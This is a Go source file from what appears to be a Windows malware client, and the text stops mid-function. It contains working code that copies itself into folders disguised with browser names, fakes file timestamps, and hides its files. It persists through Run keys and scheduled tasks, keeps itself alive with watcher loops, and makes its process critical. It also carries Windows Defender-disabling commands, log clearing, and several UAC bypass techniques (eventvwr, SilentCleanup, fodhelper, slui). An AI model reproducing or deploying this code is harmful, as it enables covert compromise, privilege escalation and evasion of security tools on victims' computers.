//Should Contain
//UAC Exploit Kit
//Startup Stuff
//Set Process Critical
//Hide Files
//Add to Windows Defender Exclusions
//Windows Defender Exclusions Watcher
//Registry Watcher

//- Smart UserKit
//	    Hide files
//	    Make Process Critical
//	    Watch Registry for Changes and Fix
//	    Add to Windows Defender Exclusions (Add-MpPreference -ExclusionPath '%AppData%')
//	    Watch Windows Defender Exclusions for Changes and Fix (Get-MpPreference | Select-Object -Property ExclusionPath)
//
//	- Smart UAC Exploit
//		Checks to find if client in vulnerable to any of 15+ UAC, Elevation and Persistence Methods and picks the best one for the client

//TODO:
// - Rewrite and Clean code
// - Remove Un-needed functions
// - Add more options to Smart Copy
// - Write better Watcher
// - Handle Windows Defender
// - Make SmartUAC smarter

package core

//Will Trigger "implicit declaration" warning in cgo compiler, please ignore.
/*
#include <stdio.h>
#include <Windows.h>
#include <Processthreadsapi.h>
#pragma comment(lib, "Advapi32.lib")
static void add_mitigations(HANDLE hProc)
{
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY signature = { 0 };
	GetProcessMitigationPolicy(hProc, ProcessSignaturePolicy, &signature, sizeof(signature));
	signature.MicrosoftSignedOnly = 1;
	if (!SetProcessMitigationPolicy(ProcessSignaturePolicy, &signature, sizeof(signature))) {
		return;
	}
}
int acgTrigger()
{
	HANDLE hProcess = GetCurrentProcess();
	add_mitigations(hProcess);
	return 0;
}
*/
//import "C"

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func CallACG() {
	//C.acgTrigger()
}

func CheckFirstBoot() bool {
	if SmartCopy { //Check if its using the SmartCopy method
		for i := 0; i < len(SmartCopyNames); i++ {
			val, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\"+SmartCopyNames[i]+"\\", "0")
			if err == nil {
				for i := 0; i < len(SmartCopyNames); i++ {
					values := strings.Split(Base64Decode(val), "|")
					if values[0] == SmartCopyNames[i] {
						InstalledName = SmartCopyNames[i]
						InstalledFolderName = SmartCopyNames[i]
						InstalledLocationU = values[1]
						InstalledLocationA = values[2]
						return false
					}
				}
			}
		}
	} else { //Check if its using the Normal method
		for i := 0; i < len(InstallFolderName); i++ {
			val, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\"+InstallFolderName[i]+"\\", "0")
			if err == nil {
				for i := 0; i < len(InstallNames); i++ {
					values := strings.Split(Base64Decode(val), "|")
					if values[0] == InstallNames[i] {
						InstalledName = InstallNames[i]
						InstalledFolderName = InstallFolderName[i]
						InstalledLocationU = values[1]
						InstalledLocationA = values[2]
						return false
					}
				}
			}
		}
		return true
	}
	return true
}

func UserKitInstall() {
	InstalledName = InstallNames[rand.Intn(len(InstallNames))]
	InstalledFolderName = InstallFolderName[rand.Intn(len(InstallFolderName))]
	InstalledLocationU = InstallUserLocations[rand.Intn(len(InstallUserLocations))]
	InstalledLocationA = InstallAdminLocations[rand.Intn(len(InstallAdminLocations))]

	IssuePowershell("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v Hidden /t REG_DWORD /d 2 /f")
	IssuePowershell("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v ShowSuperHidden /t REG_DWORD /d 0 /f")

	if AdminState {
		if SmartCopy {
			var BrowserName string

			DefaultBrowser, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "ProgId")
			if err != registry.ErrNotExist {
				if strings.Contains(strings.ToLower(DefaultBrowser), "chrome") {
					BrowserName = "Chrome"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "firefox") {
					BrowserName = "Firefox"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "safari") {
					BrowserName = "Safari"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "opera") {
					BrowserName = "Opera"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "brave") {
					BrowserName = "Brave"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "edge") {
					BrowserName = "Edge"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "vivaldi") {
					BrowserName = "Vivaldi"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "maxthon") {
					BrowserName = "Maxthon"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "facebook") {
					BrowserName = "Facebook"
				} else {
					BrowserName = "Chromium"
				}
			}

			if !CheckIfFileExists(os.Getenv("APPDATA") + "\\" + BrowserName + "\\") {

				CreateDirectory(os.Getenv("APPDATA")+"\\"+BrowserName+"\\", os.FileMode(544))
				CreateDirectory(os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon", os.FileMode(544))

				_ = CopyFileToDirectory(os.Args[0], os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe")

				IssuePowershell(`Set-ItemProperty -Path ` + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe" + ` -Name CreationTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe" + ` -Name LastWriteTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe" + ` -Name LastAccessTime -Value "` + "06/13/2022 3:16 PM" + `"`)

				IssuePowershell(fmt.Sprintf("attrib +S +H +R "+"\"%s", os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe\""))

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\WIN32.ddl")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\WIN32.ddl", 1)

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\" + BrowserName + " Updater.exe")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\"+BrowserName+" Updater.exe", 4)

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + " Dameon.exe")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+" Dameon.exe", 12)

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\" + BrowserName + " Dameon.dll")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\"+BrowserName+" Dameon.dll", 2)

				IssuePowershell(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR '` + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe'  /TN HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + BrowserName + " /F")

				IssuePowershell(`REG ADD "HKCU\Software\` + BrowserName + `"`)

				_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\"+BrowserName+"\\", "0", Base64Encode(BrowserName+"|"+os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe"+"|"+os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe"))

				AddToFirewall(BrowserName, os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe")

				IssuePowershell("Start-Process " + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe -Verb runAs")
				os.Exit(0)
			} else { //IF SMARTCOPY DETECTS APPLICATION FOLDERS
				CreateDirectory(InstalledLocationA+"\\"+InstalledFolderName+"\\", os.FileMode(544))

				_ = CopyFileToDirectory(os.Args[0], InstalledLocationA+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

				IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name CreationTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastWriteTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastAccessTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR '` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe'  /TN HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + InstalledName + " /F")

				IssuePowershell(fmt.Sprintf("attrib +S +H +R "+"\"%s", InstalledLocationA+"\\"+InstalledFolderName+"\\"+InstalledName+".exe\""))
				IssuePowershell(fmt.Sprintf("attrib +S +H "+"\"%s", InstalledLocationA+"\\"+InstalledFolderName+"\""))

				AddToFirewall(InstalledName, InstalledLocationA+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

				IssuePowershell("Start-Process " + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe -Verb runAs")
				os.Exit(0)
			}
		} else { //IF CLIENT IS USING SMARTCOPY
			CreateDirectory(InstalledLocationA+"\\"+InstalledFolderName+"\\", os.FileMode(544))

			_ = CopyFileToDirectory(os.Args[0], InstalledLocationA+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

			IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name CreationTime -Value "` + "06/13/2022 3:16 PM" + `"`)
			IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastWriteTime -Value "` + "06/13/2022 3:16 PM" + `"`)
			IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastAccessTime -Value "` + "06/13/2022 3:16 PM" + `"`)

			IssuePowershell(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR '` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe'  /TN HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + InstalledName + " /F")

			IssuePowershell(fmt.Sprintf("attrib +S +H +R "+"\"%s", InstalledLocationA+"\\"+InstalledFolderName+"\\"+InstalledName+".exe\""))
			IssuePowershell(fmt.Sprintf("attrib +S +H "+"\"%s", InstalledLocationA+"\\"+InstalledFolderName+"\""))

			AddToFirewall(InstalledName, InstalledLocationA+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

			IssuePowershell("Start-Process " + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe -Verb runAs")
			os.Exit(0)
		}
	} else { // IF CLIENT HAS ADMIN RIGHTS
		if SmartCopy {
			var BrowserName string

			DefaultBrowser, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "ProgId")
			if err != registry.ErrNotExist {
				if strings.Contains(strings.ToLower(DefaultBrowser), "chrome") {
					BrowserName = "Chrome"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "firefox") {
					BrowserName = "Firefox"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "safari") {
					BrowserName = "Safari"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "opera") {
					BrowserName = "Opera"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "brave") {
					BrowserName = "Brave"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "edge") {
					BrowserName = "Edge"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "vivaldi") {
					BrowserName = "Vivaldi"
				} else if strings.Contains(strings.ToLower(DefaultBrowser), "maxthon") {
					BrowserName = "Maxthon"
				} else {
					BrowserName = "xShare"
				}
			}

			if !CheckIfFileExists(os.Getenv("APPDATA") + "\\" + BrowserName + "\\") {
				CreateDirectory(os.Getenv("APPDATA")+"\\"+BrowserName+"\\", os.FileMode(544))

				CreateDirectory(os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon", os.FileMode(544))

				_ = CopyFileToDirectory(os.Args[0], os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe")

				IssuePowershell(`Set-ItemProperty -Path ` + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe" + ` -Name CreationTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe" + ` -Name LastWriteTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe" + ` -Name LastAccessTime -Value "` + "06/13/2022 3:16 PM" + `"`)

				IssuePowershell(fmt.Sprintf("attrib +S +H +R "+"\"%s", os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe\""))

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\WIN32.ddl")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\WIN32.ddl", 1)

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\" + BrowserName + " Updater.exe")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\"+BrowserName+" Updater.exe", 4)

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + " Dameon.exe")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+" Dameon.exe", 12)

				os.Create(os.Getenv("APPDATA") + "\\" + BrowserName + "\\" + BrowserName + " Dameon.dll")
				BytePump(os.Getenv("APPDATA")+"\\"+BrowserName+"\\"+BrowserName+" Dameon.dll", 2)

				IssuePowershell(`REG ADD "HKCU\Software\` + BrowserName + `"`)

				_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\"+BrowserName+"\\", "0", Base64Encode(BrowserName+"|"+os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe"+"|"+os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe"))

				_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", BrowserName, os.Getenv("APPDATA")+"\\"+BrowserName+"\\Dameon\\"+BrowserName+".exe")

				IssuePowershell("Start-Process " + os.Getenv("APPDATA") + "\\" + BrowserName + "\\Dameon\\" + BrowserName + ".exe")
				os.Exit(0)
			} else { //IF SMARTCOPY DETECTS APPLICATION FOLDERS
				CreateDirectory(InstalledLocationU+"\\"+InstalledFolderName+"\\", os.FileMode(544))

				_ = CopyFileToDirectory(os.Args[0], InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

				IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name CreationTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastWriteTime -Value "` + "06/13/2022 3:16 PM" + `"`)
				IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastAccessTime -Value "` + "06/13/2022 3:16 PM" + `"`)

				IssuePowershell(fmt.Sprintf("attrib +S +H +R "+"\"%s", InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe\""))
				IssuePowershell(fmt.Sprintf("attrib +S +H "+"\"%s", InstalledLocationU+"\\"+InstalledFolderName+"\""))

				_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", InstalledName, InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

				IssuePowershell("Start-Process " + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe")
				os.Exit(0)
			}
		} else { //IF CLIENT IS USING SMARTCOPY
			CreateDirectory(InstalledLocationU+"\\"+InstalledFolderName+"\\", os.FileMode(544))

			_ = CopyFileToDirectory(os.Args[0], InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

			IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name CreationTime -Value "` + "06/13/2022 3:16 PM" + `"`)
			IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastWriteTime -Value "` + "06/13/2022 3:16 PM" + `"`)
			IssuePowershell(`Set-ItemProperty -Path ` + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe" + ` -Name LastAccessTime -Value "` + "06/13/2022 3:16 PM" + `"`)

			IssuePowershell(fmt.Sprintf("attrib +S +H +R "+"\"%s", InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe\""))
			IssuePowershell(fmt.Sprintf("attrib +S +H "+"\"%s", InstalledLocationU+"\\"+InstalledFolderName+"\""))

			_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", InstalledName, InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")

			IssuePowershell("Start-Process " + InstalledLocationU + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe")
			os.Exit(0)
		}
	}

	if HideFromDefender { //Why disable WD, Just make it not detect the Client that way it still detects other malware
		if AdminState {
			//Add client location to exclusions
			//Add client to exclusions
			//Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths

		}
	}
	//fmt.Println("Install finished")
	//Start new version of self, Close me.
}

func DisableWindowsDefender() bool { //Need Admin rights to try.
	//NSudo Attempt Disable SmartScreen, Defender Notifications, SC Delete windefend
	//powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
	//powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
	//powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
	//powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
	//powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
	//powershell.exe -command "Set-MpPreference -PUAProtection disable"
	//powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
	//powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
	//powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
	//powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
	//powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"
	//powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
	//powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
	//powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"
	//powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
	//powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
	//powershell.exe -command "netsh advfirewall set allprofiles state off"

	return true
}

func UserKitUninstall() {
	DefenceActive = false //Disable ActiveDefence
	IssuePowershell("taskkill /IM powershell.exe")
	_ = DeleteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", InstalledName)
	if AdminState {
		me, _ := syscall.GetCurrentProcess()
		SetCritical(false, uintptr(me)) //Make process non-critical
		IssuePowershell("Unregister-ScheduledTask -TaskName " + InstalledName + " -Confirm:$false")
		IssuePowershell("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f")
		_ = ClearSystemLogs()
	}
	err := CreateFileAndWriteData(os.Getenv("APPDATA")+"\\remove.bat", []byte(`ping 1.1.1.1 -n 1 -w 4000 > Nul & Del "`+os.Args[0]+`" > Nul & del "%~f0"`))
	if err == nil {
		cmd := exec.Command("cmd", "/C", os.Getenv("APPDATA")+"\\remove.bat")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_ = cmd.Start()
		os.Exit(07)
	}
	os.Exit(07)
}

func KeepProcessRunning(name, path string) { //Issues a Powershell command to start the process if its not running, Sleeps for 2 seconds.
	IssuePowershell(`powershell -noexit -command 'while(1){if((Get-Process -Name ` + name + ` -ErrorAction SilentlyContinue) -eq $null){Start-Process "` + path + `"} sleep 2}'`)
}

func ActiveDefence() {
	go WatchRegistry(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden")
	go WatchRegistry(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden")
	go WatchFiles(os.Args[0])
	go KeepAlive()
	go KeepProcessRunning(InstalledName, os.Args[0])
	if AdminState {
		me, _ := syscall.GetCurrentProcess()
		SetCritical(true, uintptr(me))
	}
	if Install {
		if AdminState {
			go WatchTasks()
		} else {
			go WatchRegistry(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", InstalledName)
		}
	}
}

//TODO: Rewrite this to be more 'smart'?

func SelectExploit(path string) {
	if ForcedUACBypass > 0 {
		if ForcedUACBypass == 1 {
			EventViewer(path)
		} else if ForcedUACBypass == 2 {
			SilentCleanup(path)
		} else if ForcedUACBypass == 3 {
			FODHelper(path)
		} else if ForcedUACBypass == 4 {
			ComputerDefaults(path)
		} else if ForcedUACBypass == 5 {
			CMSTP(path)
		} else if ForcedUACBypass == 6 {
			SLUI(path)
		} else if ForcedUACBypass == 7 {
			WSRESET(path)
		}
	} else {
		CurrentBuildNumber, _ := GetRegistryKeyValue(registry.LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuildNumber")

		k, _ := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, registry.QUERY_VALUE)
		defer k.Close()
		ConsentPromptBehaviorAdmin, _, _ := k.GetIntegerValue("ConsentPromptBehaviorAdmin")
		ConsentPromptBehaviorUser, _, _ := k.GetIntegerValue("ConsentPromptBehaviorUser")
		PromptOnSecureDesktop, _, _ := k.GetIntegerValue("PromptOnSecureDesktop")

		if int(ConsentPromptBehaviorAdmin) == 0 && int(ConsentPromptBehaviorUser) == 3 && int(PromptOnSecureDesktop) == 0 { //1 = UAC Turned Off
			IssuePowershell(" -Command \"Start-Process '" + path + "' -Verb runAs\"")
		} else { //UAC is on Check for compatible bypass
			BuildNumber, _ := strconv.Atoi(CurrentBuildNumber)
			if BuildNumber >= 10240 && BuildNumber < 99999 {
				FODHelper(path)
			} else if BuildNumber >= 9600 && BuildNumber < 99999 {
				SilentCleanup(path)
			} else if BuildNumber >= 10240 && BuildNumber < 16215 {
				SDCLT(path)
			} else if BuildNumber >= 7600 && BuildNumber < 15031 {
				EventViewer(path)
			}
		}
	}
}

func WatchRegistry(key registry.Key, regKey string, regName string) {
	var regNotifyChangeKeyValue *syscall.Proc
	changed := make(chan bool)
	if advapi32, err := syscall.LoadDLL("Advapi32.dll"); err == nil {
		if p, err := advapi32.FindProc("RegNotifyChangeKeyValue"); err == nil {
			regNotifyChangeKeyValue = p
		}
	}
	if regNotifyChangeKeyValue != nil {
		go func() {
			k, _ := registry.OpenKey(key, regKey, syscall.KEY_NOTIFY|registry.QUERY_VALUE)
			var state uint64
			for {
				regNotifyChangeKeyValue.Call(uintptr(k), 0, 0x00000001|0x00000004, 0, 0)
				val, _, err := k.GetIntegerValue(regName)
				if err != nil {
					go fixRegistry(regName, true)
				}
				if val != state {
					state = val
					changed <- val == 0
				}
			}
		}()
	}
	for {
		val := <-changed
		go fixRegistry(regName, val)
	}
}

func fixRegistry(regName string, value bool) {
	if DefenceActive {
		if regName == "Hidden" {
			//fmt.Println("Fix Hidden")
			IssuePowershell("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v Hidden /t REG_DWORD /d 2 /f")
		} else if regName == "ShowSuperHidden" {
			//fmt.Println("Fix Super Hidden" )
			IssuePowershell("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ /v ShowSuperHidden /t REG_DWORD /d 0 /f")
		} else if regName == InstalledName {
			_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", InstalledName, InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")
		} //else if regName == "0"{
		//	val,  _ := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\"+InstalledFolderName+"\\", "0")
		//	if val != Base64Encode(Base64Encode(InstalledName+"|"+InstalledLocationU+"|"+InstalledLocationA)){
		//		fmt.Println("REG ADD Folder", IssuePowershell(`REG ADD "HKCU\Software\`+InstalledFolderName+`"`))
		//		err := WriteRegistryKey(registry.CURRENT_USER, "Software\\"+InstalledFolderName+"\\", "0", Base64Encode(InstalledName+"|"+InstalledLocationU+"|"+InstalledLocationA))
		//		fmt.Println("REG ADD Settings", err)
		//	}
		//	}
	}
}

func WatchFiles(path string) {
	for DefenceActive {
		if AdminState {
			if !CheckIfFileExists(path) {
				_ = CopyFileToDirectory(os.Args[0], InstalledLocationA+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")
			}
		} else {
			if !CheckIfFileExists(path) {
				_ = CopyFileToDirectory(os.Args[0], InstalledLocationU+"\\"+InstalledFolderName+"\\"+InstalledName+".exe")
			}
		}
		state, _ := IsHidden(path)
		if !state {
			IssuePowershell("attrib +S +H +R " + path)
		}
		time.Sleep(5 * time.Second)
	}
}

func WatchTasks() {
	for DefenceActive {
		var output string
		output = IssuePowershell(`(Get-ScheduledTask -TaskName ` + InstalledName + `).State -eq "Ready"`)
		if strings.Contains(output, "False") {
			IssuePowershell(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR '` + InstalledLocationA + "\\" + InstalledFolderName + "\\" + InstalledName + ".exe'  /TN HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + InstalledName + " /F")
		}
		output = ""
		time.Sleep(5 * time.Second)
	}
}

//TODO Encode Commands to Bytes->Base64 and use powershell.exe -encodedCommand to run it
//[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("whoami")) = dwBoAG8AYQBtAGkA
//powershell.exe -encodedCommand dwBoAG8AYQBtAGkA

func EventViewer(path string) { //7600 to 15031
	IssuePowershell("REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d " + path)
	time.Sleep(1 * time.Second)
	IssuePowershell("start eventvwr.exe")
	time.Sleep(3 * time.Second)
	IssuePowershell("REG DELETE HKCU\\Software\\Classes\\mscfile /f ")
	os.Exit(1)
}

func SilentCleanup(path string) { //9600 to 99999
	_ = WriteRegistryKey(registry.CURRENT_USER, "Environment", "windir", "cmd.exe /k start "+path+" &REM")
	time.Sleep(2 * time.Second)
	IssuePowershell("schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	time.Sleep(1 * time.Second)
	IssuePowershell("REG DELETE HKCU\\Environment\\ /v windir /F")
	time.Sleep(1 * time.Second)
	os.Exit(1)
}

func SLUI(path string) { //9600 to 99999
	IssuePowershell("REG ADD HKCU\\Software\\Classes\\exefile\\shell\\open\\command")
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\exefile\\shell\\open\\command", "DelegateExecute", "")
	time.Sleep(1 * time.Second)
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\exefile\\shell\\open\\command", "", "cmd /c start "+path)
	time.Sleep(1 * time.Second)
	IssuePowershell("Start-Process \"C:\\Windows\\System32\\slui.exe\" -WindowStyle Hidden")
	time.Sleep(3 * time.Second)
	IssuePowershell("REG DELETE HKCU\\Software\\Classes\\exefile\\shell\\open\\command /f ")
}

func CMSTP(path string) { //7600 to 99999 UAC bypass using cmstp.exe
